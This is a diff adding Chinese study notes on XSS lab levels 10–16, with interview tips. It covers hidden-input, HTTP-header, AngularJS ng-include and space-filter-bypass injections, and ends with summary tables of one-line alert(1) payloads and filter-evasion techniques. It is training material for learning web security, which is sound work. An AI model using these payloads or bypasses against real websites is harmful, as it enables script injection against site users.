@@ -443,3 +443,149 @@ echo "<a href=\"" . $str . "\">友情链接</a>";
 > 核心技巧：利用JS注释 `//` 或 `/* */` 吃掉多余的校验内容。
 
 ---
+
+### 3.4 隐藏参数注入（Level 10）
+
+Level 10 的回显位置藏在了 `<input type="hidden">` 中。
+
+**源码分析：**
+
+页面源码中有一个隐藏的 `<input>` 标签，`name="t_sort"`：
+
+```html
+<input name="t_sort" type="hidden" value="">
+```
+
+URL参数 `t_sort` 的值被拼入 `value` 属性。
+
+**Payload：**
+
+```
+?t_sort=" onclick=alert(1)" type="text
+```
+
+拼接后：
+
+```html
+<input name="t_sort" type="hidden" value="" onclick=alert(1)" type="text">
+```
+
+两个关键技巧：
+- `" ` 闭合 value → 加 `onclick` 事件 → 用另一个 `"` 闭合属性
+- `type="text"` 将 hidden 覆盖为 text → 输入框变为可见，可以点击触发
+
+> **盲测思路**：不是所有注入点都肉眼可见。F12 审查元素，逐个找 `<input>` 标签的 `name` 属性值，把这些参数名一个个加到URL上测试。
+
+### 3.5 HTTP头注入（Level 11 ~ Level 13）
+
+这三关将注入位置从URL参数转移到了HTTP请求头。核心理解：**服务端读取HTTP头并输出到HTML时，如果未做过滤，HTTP头就成了注入通道。**
+
+**源码分析（通用模式）：**
+
+```php
+$referer = $_SERVER['HTTP_REFERER'];  // 或 HTTP_USER_AGENT / HTTP_COOKIE
+echo "<input value=\"" . $referer . "\">";
+```
+
+| 关卡 | 注入头 | Payload | 工具 |
+|------|--------|---------|------|
+| Level 11 | `Referer` | `" onclick=alert(1)" type="text` | Burp Suite / 浏览器F12修改Header |
+| Level 12 | `User-Agent` | `" onclick=alert(1)" type="text` | 同上 |
+| Level 13 | `Cookie` | `user=" onclick=alert(1)" type="text` | 浏览器F12 Application面板修改Cookie |
+
+**统一payload思路**：和 Level 10 完全一致——闭合 `value` 属性 → 注入 `onclick` 事件 → `type="text"` 让 input 可见。
+
+> **面试提示**：HTTP头注入是很多入门者容易忽略的攻击面。面试官问"除了GET/POST参数，还有哪些XSS注入点？"→ 答：**Cookie、Referer、User-Agent、X-Forwarded-For**。
+
+### 3.6 AngularJS 框架XSS（Level 15）
+
+Level 15 使用了 AngularJS 的 `ng-include` 指令动态加载页面片段，引入了一种完全不同类型的XSS。
+
+**源码分析：**
+
+```html
+<div ng-app="" ng-include="'src'">
+```
+
+`ng-include` 会根据 `src` 参数加载外部HTML片段。注意：`src` 是参数名，不是URL路径。
+
+**三个坑：**
+
+1. **参数名**：是 `src` 而不是其他名字，通过F12查看源码中的 `ng-include="'src'"` 确认
+2. **嵌套 `?` 需要编码**：URL中 `?` 是参数分隔符，如果 payload 中有第二个 `?`（如 `level1.php?name=...`），必须编码为 `%3F`
+3. **AngularJS 语法**：`ng-include` 加载的是HTML片段，不需要 Angular 表达式
+
+**Payload：**
+
+```
+?src=level1.php?name=<svg onload=alert(1)>
+```
+
+经过URL编码后：
+
+```
+?src=level1.php%3Fname=%3Csvg%20onload%3Dalert(1)%3E
+```
+
+思路：通过 `ng-include` 加载 Level 1 的页面，并在 `name` 参数中传入XSS payload。Level 1 无任何过滤，`<svg onload=alert(1)>` 直接触发。
+
+> 面试中大概率不考框架级XSS，但可以提一句：AngularJS 的 `{{constructor.constructor('alert(1)')()}}` 是经典的沙箱逃逸 payload。
+
+### 3.7 空格过滤绕过（Level 16）
+
+Level 16 将空格编码为 `&nbsp;`，导致 `<img src=x onerror=alert(1)>` 中空格全部变成不可分割空格，标签解析失败。
+
+**Payload：**
+
+```html
+<img/src=x/onerror=alert(1)>
+```
+
+HTML标签中 `/` 可以作为属性分隔符，替代空格。这是绕过空格过滤最干净的方案。
+
+> 其他替代方案：`%0a`（换行符）、`%0d`（回车符）、`%09`（制表符）也可以在某些场景作为空白分隔。
+
+### 3.8 第三章节总结
+
+#### 绕过姿势汇总表
+
+| 被过滤内容 | 关联关卡 | 绕过手法 |
+|-----------|----------|----------|
+| `<>` 被编码 | Level 4 | 不用新标签，用属性闭合 `" onclick=` |
+| `on` 事件属性 | Level 5~7 | 大小写 `On`/`ON`；换思路用 `<a href="javascript:">` 伪协议 |
+| `script` 关键字 | Level 8 | HTML实体编码 `&#106;&#97;&#118;...` |
+| `script` + URL校验 | Level 9 | 实体编码 + `//http://` 注释吃掉校验内容 |
+| 参数藏起来 | Level 10 | F12找隐藏input的name属性 |
+| 注入点不在URL参数 | Level 11~13 | HTTP头注入：Referer / UA / Cookie |
+| AngularJS框架 | Level 15 | `ng-include` 加载外部页面 + 参数编码 |
+| 空格过滤 | Level 16 | `/` 替代空格，或用 `%0a` |
+
+#### 关卡速查
+
+| 关卡 | 上下文 | 一句话payload |
+|------|--------|---------------|
+| 1 | 纯文本回显 | `<script>alert(1)</script>` |
+| 2 | `<input value="">` | `" onclick=alert(1)` |
+| 3 | `<input value=''>` | `' onclick=alert(1)` |
+| 4 | `<input value="">` `<>`编码 | `" onclick=alert(1)` |
+| 5 | `<input value="">` `on`→`o_n` | `<a href="javascript:alert(1)">click</a>` |
+| 6 | 过滤 `on`/`href` | `" Onclick=alert(1)` |
+| 7 | 过滤 `on` | `" ONclick=alert(1)` |
+| 8 | `<a href="">` `script`→`scr_ipt` | `&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)` |
+| 9 | Level 8 + URL校验 | 同上 + `//http://` |
+| 10 | 隐藏 `<input type="hidden">` | `?t_sort=" onclick=alert(1)" type="text` |
+| 11 | Referer头 → `<input>` | `Referer: " onclick=alert(1)" type="text` |
+| 12 | User-Agent头 | `UA: " onclick=alert(1)" type="text` |
+| 13 | Cookie头 | `user=" onclick=alert(1)" type="text` |
+| 15 | AngularJS ng-include | `?src=level1.php%3Fname=%3Csvg%20onload%3Dalert(1)%3E` |
+| 16 | 空格 → `&nbsp;` | `<img/src=x/onerror=alert(1)>` |
+
+#### 薄弱点提示
+
+| 短板 | 原因 | 怎么补 |
+|------|------|--------|
+| 编码绕过不熟 | 分不清HTML实体/URL/JS Unicode的适用场景 | 记住：HTML中 `&#ASCII;`、URL中 `%HH`、JS中 `\xHH` |
+| 事件属性记不住 | onload/onerror作用域不清楚 | 背5个：`onclick`(点击) `onerror`(报错) `onload`(加载) `onfocus`(聚焦) `onmouseover`(悬停) |
+| 不同数据来源 | 习惯了只在URL参数找注入点 | 盲测顺序：URL参数 → POST表单 → HTTP头(Referer/UA/Cookie) → 隐藏参数 |
+
+---
